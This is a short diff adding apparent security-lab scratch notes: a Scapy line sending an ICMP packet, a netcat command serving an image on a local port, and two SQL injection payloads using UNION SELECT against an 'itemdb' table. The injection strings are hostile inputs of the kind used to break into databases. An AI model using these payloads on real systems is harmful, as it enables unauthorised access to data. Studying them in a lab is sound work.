@@ -1,0 +1,8 @@
+packet= IP(dst='8.8.8.8')/ICMP()
+send(packet)
+
+nc -l -p 8080 < image.jpg
+http://localhost:8080
+
+x' UNION SELECT COUNT(itemnum),2,3,4 FROM itemdb -- 
+x' UNION SELECT count(itemnum),count(itemnum),count(itemnum),count(itemnum) FROM itemdb --
